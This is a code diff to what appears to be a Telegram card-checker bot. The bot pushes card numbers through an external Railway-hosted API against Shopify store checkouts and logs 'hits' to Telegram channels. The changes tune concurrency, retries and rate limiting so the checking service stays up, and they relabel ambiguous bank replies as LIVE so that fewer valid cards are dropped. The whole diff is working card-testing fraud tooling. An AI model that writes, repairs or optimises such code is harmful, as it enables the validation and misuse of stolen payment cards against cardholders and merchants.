@@ -60,7 +60,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://shopi.up.railway.app/shopii"
+API_URL       = "https://luci.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -77,13 +77,25 @@ MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channe
 LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel
 
 SH_COOLDOWN    = 25
-SITE_RETRIES      = 80   # max site attempts per card
-SITE_TIMEOUT      = 20   # seconds per API call — generous for slow proxies
-MAX_CONCURRENT    = 50   # cards checked in parallel
-CARD_STAGGER      = 0.3  # stagger between card launches (seconds)
-SITE_BATCH        = 3    # sites raced in parallel within each retry round
-CONSEC_TIMEOUT_MAX = 45  # abort card after 45 consecutive timeouts
-                         # (15 rounds × 3 × 20s = 300s max before giving up)
+
+# ── Speed / concurrency settings ───────────────────────────────────────────
+# shopi.up.railway.app is a shared Railway app — it can't handle hundreds of
+# simultaneous connections.  Too many concurrent calls → 502/503 errors →
+# real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
+# cards falsely marked DEAD.
+#
+# Safe values that keep the API healthy:
+#   SITE_BATCH=1      → one site attempt at a time per card (no racing)
+#   MAX_CONCURRENT=8  → max 8 cards in parallel during /msh
+#   API_CONCURRENCY=20→ global hard cap on simultaneous API calls (all users)
+SITE_RETRIES       = 20   # max site attempts per card (was 80 — overkill)
+SITE_TIMEOUT       = 30   # seconds per API call — generous for slow Railway
+MAX_CONCURRENT     = 8    # cards in parallel during /msh  (was 50)
+CARD_STAGGER       = 1.5  # seconds between card launches  (was 0.3)
+SITE_BATCH         = 1    # sites tried per round (was 3 — caused API floods)
+ROUND_DELAY        = 0.5  # seconds to sleep between retry rounds per card
+CONSEC_TIMEOUT_MAX = 5    # abort after 5 consecutive timeouts (was 45)
+API_CONCURRENCY    = 20   # global semaphore cap — max simultaneous API calls
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -100,6 +112,17 @@ _ALL_PROXIES: list  = []
 # would serialize 1000 blocking disk reads on the event loop.
 # These TTL caches ensure disk is only touched once per interval — every
 # subsequent call returns the in-memory copy instantly (no I/O, no blocking).
+# Global API rate-limiter — created lazily on first use (asyncio.Semaphore
+# must be created inside a running event loop, not at import time).
+_API_SEM: "asyncio.Semaphore | None" = None
+
+def _get_api_sem() -> "asyncio.Semaphore":
+    """Return (creating if needed) the global API concurrency semaphore."""
+    global _API_SEM
+    if _API_SEM is None:
+        _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
+    return _API_SEM
+
 _PROXY_CACHE_TS:  float = 0.0
 _PROXY_CACHE_TTL: float = 300.0   # refresh proxies from disk every 5 minutes
 
@@ -423,14 +446,89 @@ def classify_response(resp: str) -> str:
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
-    # Unknown response — try another site; never mark the card dead on unknown
-    return "ERROR"
+    # ── Unknown response → LIVE ───────────────────────────────────────────────
+    # If the response reached here it is NOT a known site error, NOT a known
+    # hard-decline, and NOT a TDS/charged response.  The bank replied with
+    # something we haven't seen before — that still means the card is real.
+    # Returning LIVE (rather than ERROR/DEAD) prevents valid cards from being
+    # silently dropped during retries and eventually marked DEAD.
+    return "LIVE"
+
+
+# ── Display map: raw API response string → clean human-readable label ────────
+# ALL known shopi.up.railway.app response strings are listed here.
+# _clean_resp() does an exact-match (case-insensitive) lookup first,
+# then falls back to site-error pattern matching, then returns the raw string.
+_RESP_DISPLAY: dict = {
+    # ── CHARGED ───────────────────────────────────────────────────────────────
+    "ORDER_PAID":              "Order Paid",
+    "PAYMENT_AUTHORIZED":      "Payment Authorized",
+    "PAYMENT_ACCEPTED":        "Payment Accepted",
+    "CHARGED":                 "Charged",
+    "APPROVED":                "Approved",
+    # ── TDS ───────────────────────────────────────────────────────────────────
+    "3DS_REQUIRED":            "3DS Required",
+    "3D_SECURE":               "3D Secure",
+    "3DS":                     "3D Secure",
+    "AUTHENTICATION_REQUIRED": "Auth Required",
+    "SCA_REQUIRED":            "SCA Required",
+    # ── LIVE (card valid — soft / ambiguous decline) ──────────────────────────
+    "GENERIC_ERROR":           "Bank Error",        # ambiguous — card is LIVE
+    "INSUFFICIENT_FUNDS":      "Insufficient Funds",
+    "INCORRECT_CVV":           "Incorrect CVV",
+    "INCORRECT_CVC":           "Incorrect CVC",
+    "INCORRECT_ZIP":           "Incorrect ZIP",
+    "INVALID_CVC":             "Invalid CVC",
+    "INVALID_CVV":             "Invalid CVV",
+    "PCI_ERROR":               "PCI Error",
+    "CVV_FAILED":              "CVV Failed",
+    "AVS_FAILED":              "AVS Failed",
+    "RISK_BLOCKED":            "Risk Blocked",
+    "SECURITY_VIOLATION":      "Security Violation",
+    "CALL_ISSUER":             "Call Issuer",
+    # ── DEAD (hard bank decline) ──────────────────────────────────────────────
+    "CARD_DECLINED":           "Card Declined",
+    "GENERIC_DECLINE":         "Generic Decline",
+    "DO NOT HONOR":            "Do Not Honor",
+    "DO_NOT_HONOR":            "Do Not Honor",
+    "UNKNOWN_ERROR":           "Unknown Error",
+    "PROCESSING_ERROR":        "Processing Error",
+    "PICK_UP_CARD":            "Pick Up Card",
+    "DECISION_RULE_BLOCK":     "Risk Blocked",
+    "FRAUD_SUSPECTED":         "Fraud Suspected",
+    "EXPIRED_CARD":            "Expired Card",
+    "STOLEN_CARD":             "Stolen Card",
+    "LOST_CARD":               "Lost Card",
+    "RESTRICTED_CARD":         "Restricted Card",
+    "TRANSACTION_NOT_ALLOWED": "Transaction Not Allowed",
+    "INVALID_PURCHASE_TYPE":   "Invalid Purchase",
+    "INVALID_PAYMENT_METHOD":  "Invalid Payment",
+    "TEST_MODE_LIVE_CARD":     "Test Mode Card",
+    "AMOUNT_TOO_SMALL":        "Amount Too Small",
+    "INCORRECT_NUMBER":        "Incorrect Number",
+}
 
 
 def _clean_resp(resp: str) -> str:
-    """For display only — make site errors human-readable."""
+    """For display only — convert raw API strings to clean human-readable labels.
+
+    Lookup order:
+      1. Exact match in _RESP_DISPLAY (covers all known bank / API responses).
+      2. Site/infra error pattern matching (site errors, timeouts, etc.).
+      3. Raw response string as-is (fallback for unknown future responses).
+    """
     if not resp:
         return "Dead"
+
+    # 1. Exact match (case-insensitive) against the display map
+    key = resp.strip().upper()
+    if key in _RESP_DISPLAY:
+        return _RESP_DISPLAY[key]
+    # Also try the original casing in case the map has mixed-case keys
+    if resp.strip() in _RESP_DISPLAY:
+        return _RESP_DISPLAY[resp.strip()]
+
+    # 2. Site / infra error patterns
     r = resp.lower()
     if "site error!" in r or "site error" in r:
         m = re.search(r"status:\s*(\d+)", r)
@@ -444,6 +542,8 @@ def _clean_resp(resp: str) -> str:
         return "Connection Error"
     if "timeout" in r:
         return "Timeout"
+
+    # 3. Unknown — return as-is (don't hide future API responses)
     return resp
 
 
@@ -860,63 +960,71 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
     Status is authoritative:
         true  → ORDER_PAID  (CHARGED)
         false → use Response string (LIVE / DEAD / RETRY)
+
+    Rate limiting:
+        _get_api_sem() caps simultaneous calls across ALL users to
+        API_CONCURRENCY.  Without this, 1000 users × SITE_BATCH would
+        send hundreds of simultaneous requests to Railway and trigger
+        502/503 responses — hiding real bank results (PCI_ERROR, etc.).
     """
     site_clean = _strip_scheme(site)      # drop any https:// prefix
-    px         = _proxy_url(proxy)
-    url = (f"{API_URL}?cc={card}&site={site_clean}&proxy={px}"
-           if px else f"{API_URL}?cc={card}&site={site_clean}")
+    # New API (luci.up.railway.app) loads proxies from px.txt server-side
+    # automatically — no &proxy= param needed or accepted.
+    url = f"{API_URL}?cc={card}&site={site_clean}"
 
-    # connect=5 → hung proxies fail fast; sock_read=timeout → generous for slow proxies
-    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
-    try:
-        async with aiohttp.ClientSession(timeout=_to) as session:
-            async with session.get(url, ssl=False) as r:
-                http_st = r.status
-                raw     = await r.text()
+    # Global rate-limit: only API_CONCURRENCY calls may be in-flight at once.
+    # This prevents 1000 concurrent users from flooding Railway and getting
+    # 502/503 errors that hide real bank responses (PCI_ERROR, GENERIC_ERROR…).
+    async with _get_api_sem():
+        # connect=5 → hung proxies fail fast; sock_read=timeout → slow Railway OK
+        _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
+        try:
+            async with aiohttp.ClientSession(timeout=_to) as session:
+                async with session.get(url, ssl=False) as r:
+                    http_st = r.status
+                    raw     = await r.text()
 
-                # Empty body = API couldn't reach the store
-                if not raw or not raw.strip():
-                    return ("site error! status: 404",
-                            "Shopify Payments", "0.00", "USD", http_st)
-
-                if http_st == 200:
-                    try:
-                        data = _json.loads(raw)
-                    except Exception:
-                        # Non-JSON 200 response — treat as site error
+                    # Empty body = API couldn't reach the store
+                    if not raw or not raw.strip():
                         return ("site error! status: 404",
                                 "Shopify Payments", "0.00", "USD", http_st)
 
-                    # Normalise gateway: "shopify_payments" → "SHOPIFY PAYMENTS"
-                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
-                    gw       = _normalise_gateway(raw_gw)
-                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
-                    currency = str(data.get("Currency") or data.get("currency") or "USD")
-                    api_resp = _parse_response_field(data)
+                    if http_st == 200:
+                        try:
+                            data = _json.loads(raw)
+                        except Exception:
+                            return ("site error! status: 404",
+                                    "Shopify Payments", "0.00", "USD", http_st)
 
-                    logging.info(f"[API] {card[:6]}** {site_clean} "
-                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
-                    return api_resp, gw, price, currency, http_st
+                        raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
+                        gw       = _normalise_gateway(raw_gw)
+                        price    = str(data.get("Price")    or data.get("price")    or "0.00")
+                        currency = str(data.get("Currency") or data.get("currency") or "USD")
+                        api_resp = _parse_response_field(data)
 
-                # Non-200 HTTP status from the API server
-                _emap = {
-                    404: "site error! status: 404",
-                    403: "site error! status: 403",
-                    429: "site error! status: 429",
-                    500: "site error! status: 500",
-                    502: "site error! status: 502",
-                    503: "site error! status: 503",
-                    504: "timeout",
-                }
-                return (_emap.get(http_st, f"site error! status: {http_st}"),
-                        "Shopify Payments", "0.00", "USD", http_st)
+                        logging.info(f"[API] {card[:6]}** {site_clean} "
+                                     f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
+                        return api_resp, gw, price, currency, http_st
 
-    except asyncio.TimeoutError:
-        return ("timeout", "Shopify Payments", "0.00", "USD", None)
-    except asyncio.CancelledError:
-        raise
-    except Exception as e:
-        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
+                    # Non-200 HTTP from the API server itself
+                    _emap = {
+                        404: "site error! status: 404",
+                        403: "site error! status: 403",
+                        429: "site error! status: 429",
+                        500: "site error! status: 500",
+                        502: "site error! status: 502",
+                        503: "site error! status: 503",
+                        504: "timeout",
+                    }
+                    return (_emap.get(http_st, f"site error! status: {http_st}"),
+                            "Shopify Payments", "0.00", "USD", http_st)
+
+        except asyncio.TimeoutError:
+            return ("timeout", "Shopify Payments", "0.00", "USD", None)
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1099,12 +1207,19 @@ async def _check_card_with_retry(
             logging.warning(
                 f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
                 f"({consec_timeouts * site_timeout:.0f}s wasted) — "
-                f"proxies likely dead, aborting early"
+                f"aborting early"
             )
             return "DEAD", "timeout", price, currency
 
+        # ── Pace: small delay between rounds to avoid flooding the API ─
+        await asyncio.sleep(ROUND_DELAY)
+
     # ── All attempts exhausted ────────────────────────────────────────
+    # If the last real bank response was an ambiguous/unknown one (not a
+    # site error), surface it as LIVE rather than silently marking DEAD.
     logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
+    if last_resp and _is_success_response(last_resp):
+        return "LIVE", last_resp, price, currency
     return "DEAD", last_resp, price, currency
 
 
